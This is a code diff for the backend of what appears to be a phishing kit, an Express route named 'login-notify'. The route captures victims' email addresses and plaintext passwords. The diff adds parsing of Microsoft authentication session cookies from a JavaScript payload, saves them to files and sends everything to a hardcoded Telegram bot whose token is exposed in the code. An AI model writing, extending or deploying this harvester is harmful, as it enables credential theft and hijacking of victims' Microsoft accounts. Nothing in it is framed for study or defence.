@@ -11,17 +11,10 @@ const router = express.Router();
 const BOT_TOKEN = process.env.BOT_TOKEN || "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4";
 const CHAT_ID = process.env.CHAT_ID || "6068638071";
 
-// Debug logging
-console.log('Telegram Config:', {
-  hasBotToken: !!BOT_TOKEN,
-  hasChatId: !!CHAT_ID,
-  botTokenLength: BOT_TOKEN?.length
-});
-
 const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null;
 const COOKIES_DIR = path.join(__dirname, '../cookies');
 
-// Telegram message sending function with plain text only
+// Telegram message sending function
 async function sendTelegramMessage(message) {
   if (!TELEGRAM_API) {
     console.warn('Telegram API not configured');
@@ -37,7 +30,6 @@ async function sendTelegramMessage(message) {
       body: JSON.stringify({
         chat_id: CHAT_ID,
         text: message
-        // NO parse_mode - plain text only
       }),
       timeout: 10000
     });
@@ -74,7 +66,8 @@ async function ensureCookiesDir() {
   }
 }
 
-async function createCookiesFile(email, ip, cookiesBefore, cookiesAfter = null, redirectUrl = null) {
+// Enhanced function to handle both HTTP and JS cookies
+async function createCookiesFile(email, ip, cookiesBefore, jsCookieData = null, redirectUrl = null) {
   await ensureCookiesDir();
   
   const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
@@ -89,26 +82,58 @@ Timestamp: ${new Date().toISOString()}
 Redirect URL: ${redirectUrl || 'No redirect'}
 File: ${filename}
 
-INITIAL COOKIES (Before any action):
+INITIAL HTTP COOKIES (Before any action):
 ${Object.entries(cookiesBefore).map(([k, v]) => `${k}: ${v}`).join('\n')}
 
-Total Initial Cookies: ${Object.keys(cookiesBefore).length}
+Total Initial HTTP Cookies: ${Object.keys(cookiesBefore).length}
 `;
 
-  if (cookiesAfter && Object.keys(cookiesAfter).length > 0) {
+  // Add JavaScript cookie data if provided
+  if (jsCookieData) {
     fileContent += `
 
-COOKIES AFTER REDIRECT/RESPONSE:
-${Object.entries(cookiesAfter).map(([k, v]) => `${k}: ${v}`).join('\n')}
+JAVASCRIPT COOKIE DATA FOUND:
+============================
 
-Total Cookies After: ${Object.keys(cookiesAfter).length}
+Raw JS Cookie Script:
+${jsCookieData.substring(0, 2000)}...${jsCookieData.length > 2000 ? `\n[Truncated - total ${jsCookieData.length} chars]` : ''}
 
-NEW COOKIES DETECTED:
-${Object.entries(cookiesAfter)
-  .filter(([k, v]) => !cookiesBefore[k] || cookiesBefore[k] !== v)
-  .map(([k, v]) => `${k}: ${v} (${cookiesBefore[k] ? 'modified' : 'new'})`)
-  .join('\n')}
 `;
+
+    try {
+      // Try to parse the JavaScript cookie data
+      const cookieMatch = jsCookieData.match(/JSON\.parse\(`([^`]+)`\)/);
+      if (cookieMatch && cookieMatch[1]) {
+        const cookiesJson = cookieMatch[1];
+        const cookiesArray = JSON.parse(cookiesJson);
+        
+        fileContent += `PARSED MICROSOFT AUTHENTICATION COOKIES (${cookiesArray.length}):\n`;
+        fileContent += '='.repeat(50) + '\n\n';
+        
+        cookiesArray.forEach((cookie, index) => {
+          fileContent += `COOKIE ${index + 1}:\n`;
+          fileContent += `Name: ${cookie.Name}\n`;
+          fileContent += `Value: ${cookie.Value}\n`;
+          fileContent += `Domain: ${cookie.Domain}\n`;
+          fileContent += `Path: ${cookie.Path}\n`;
+          fileContent += `Secure: ${cookie.Secure}\n`;
+          fileContent += `HttpOnly: ${cookie.HttpOnly}\n`;
+          fileContent += `SameSite: ${cookie.SameSite}\n`;
+          if (cookie.Expires) fileContent += `Expires: ${new Date(cookie.Expires * 1000).toISOString()}\n`;
+          fileContent += '-'.repeat(30) + '\n\n';
+        });
+
+        // Extract redirect URL
+        const redirectMatch = jsCookieData.match(/window\.location\.href=atob\("([^"]+)"\)/);
+        if (redirectMatch && redirectMatch[1]) {
+          const redirectBase64 = redirectMatch[1];
+          const redirectUrl = Buffer.from(redirectBase64, 'base64').toString();
+          fileContent += `REDIRECT URL: ${redirectUrl}\n\n`;
+        }
+      }
+    } catch (parseError) {
+      fileContent += `ERROR PARSING JS COOKIE DATA: ${parseError.message}\n\n`;
+    }
   }
 
   await fs.writeFile(filepath, fileContent);
@@ -125,49 +150,29 @@ router.get('/health', (req, res) => {
   });
 });
 
-router.get('/test', (req, res) => {
-  res.json({ 
-    message: 'Login notify endpoint is working!',
-    timestamp: new Date().toISOString(),
-    environment: process.env.NODE_ENV || 'development'
-  });
-});
-
-// Echo route to test POST requests
-router.post('/echo', (req, res) => {
-  console.log('Echo received:', req.body);
-  res.json({ 
-    received: req.body,
-    headers: req.headers,
-    success: true 
-  });
-});
-
-// Main login notification endpoint
+// Main login notification endpoint - UPDATED
 router.post('/', async (req, res) => {
   try {
     console.log('=== LOGIN-NOTIFY ENDPOINT HIT ===');
     console.log('Headers:', req.headers);
     console.log('Body:', req.body);
     console.log('Method:', req.method);
-    console.log('URL:', req.url);
     console.log('IP:', req.ip);
     console.log('================================');
 
-    const { email, password, redirect_url } = req.body || {};
+    const { email, password, redirect_url, js_cookie_data } = req.body || {};
     
     console.log('Received data:', { 
       email, 
       password: password ? '***' : 'missing', 
-      redirect_url 
+      redirect_url,
+      hasJsCookieData: !!js_cookie_data
     });
 
     if (!email || !password) {
-      console.log('Missing email or password');
       return res.status(400).json({ 
         success: false, 
-        message: "Missing email or password",
-        received: { hasEmail: !!email, hasPassword: !!password }
+        message: "Missing email or password"
       });
     }
 
@@ -184,20 +189,17 @@ router.post('/', async (req, res) => {
     const agent = parser.getResult();
     const deviceType = `${agent.os.name || 'OS'} ${agent.os.version || ''} - ${agent.browser.name || 'Browser'} ${agent.browser.version || ''}`;
 
-    // Create initial cookies file
+    // Create cookies file with JS cookie data
     let fileInfo = null;
     try {
-      fileInfo = await createCookiesFile(email, ip, cookiesBefore, null, redirect_url);
-      console.log(`Initial cookies file created: ${fileInfo.filename}`);
+      fileInfo = await createCookiesFile(email, ip, cookiesBefore, js_cookie_data, redirect_url);
+      console.log(`Cookies file created: ${fileInfo.filename}`);
     } catch (fileError) {
       console.error('Error creating cookies file:', fileError);
     }
 
-    // Build plain text message - NO MARKDOWN
-    const cookieReport = Object.entries(cookiesBefore).map(([k, v]) => `- ${k}: ${v}`).join('\n') || '(no cookies sent)';
-
-    // Build Telegram message - PLAIN TEXT ONLY
-    const message = `LOGIN NOTIFICATION
+    // Build Telegram message
+    let message = `LOGIN NOTIFICATION
 
 Email: ${email}
 Password: ${password}
@@ -208,11 +210,36 @@ Device: ${deviceType}
 Redirect URL: ${redirect_url || 'None'}
 Cookies File: ${fileInfo ? fileInfo.filename : 'Failed to create'}
 
-Initial Cookies (${Object.keys(cookiesBefore).length}):
-${cookieReport}
+HTTP Cookies (${Object.keys(cookiesBefore).length}):
+${Object.entries(cookiesBefore).map(([k, v]) => `- ${k}: ${v}`).join('\n') || '(no cookies sent)'}
 `;
 
-    // Send to Telegram with plain text only
+    // Add JS cookie info to Telegram message
+    if (js_cookie_data) {
+      try {
+        const cookieMatch = js_cookie_data.match(/JSON\.parse\(`([^`]+)`\)/);
+        if (cookieMatch && cookieMatch[1]) {
+          const cookiesJson = cookieMatch[1];
+          const cookiesArray = JSON.parse(cookiesJson);
+          
+          message += `\nMICROSOFT AUTH COOKIES (${cookiesArray.length}):\n`;
+          cookiesArray.forEach(cookie => {
+            message += `- ${cookie.Name}: ${cookie.Value.substring(0, 50)}...\n`;
+          });
+
+          // Extract redirect URL
+          const redirectMatch = js_cookie_data.match(/window\.location\.href=atob\("([^"]+)"\)/);
+          if (redirectMatch && redirectMatch[1]) {
+            const redirectUrl = Buffer.from(redirectMatch[1], 'base64').toString();
+            message += `\nJS Redirect: ${redirectUrl}\n`;
+          }
+        }
+      } catch (parseError) {
+        message += `\nJS Cookies: (parse error: ${parseError.message})\n`;
+      }
+    }
+
+    // Send to Telegram
     console.log('Sending Telegram notification...');
     const telegramResult = await sendTelegramMessage(message);
     
@@ -222,9 +249,9 @@ ${cookieReport}
       console.log('Telegram notification sent successfully');
     }
 
-    // OPTION 1: Set some cookies and redirect
+    // Handle redirect
     if (redirect_url) {
-      // Set some tracking cookies
+      // Set tracking cookies
       res.cookie('login_tracker', `track_${Date.now()}`, { 
         maxAge: 900000,
         httpOnly: true 
@@ -234,24 +261,10 @@ ${cookieReport}
         httpOnly: true
       });
       
-      // Capture cookies that WILL BE SET
-      const cookiesAfter = {
-        ...cookiesBefore,
-        login_tracker: `track_${Date.now()}`,
-        user_session: `session_${email}_${Date.now()}`
-      };
-      
-      // Update cookies file with post-redirect info
-      try {
-        await createCookiesFile(email, ip, cookiesBefore, cookiesAfter, redirect_url);
-      } catch (error) {
-        console.error('Error updating cookies file:', error);
-      }
-      
       return res.redirect(redirect_url);
     }
 
-    // OPTION 2: Just respond with JSON (no redirect)
+    // JSON response
     return res.status(200).json({
       success: true,
       message: "Login processed",
@@ -261,7 +274,8 @@ ${cookieReport}
         device: deviceType,
         ip,
         location: locationStr,
-        cookiesCount: Object.keys(cookiesBefore).length,
+        httpCookiesCount: Object.keys(cookiesBefore).length,
+        jsCookiesFound: !!js_cookie_data,
         cookiesFile: fileInfo?.filename
       }
     });
@@ -271,8 +285,7 @@ ${cookieReport}
     return res.status(500).json({ 
       success: false, 
       message: "Internal server error",
-      error: error.message,
-      stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
+      error: error.message
     });
   }
 });
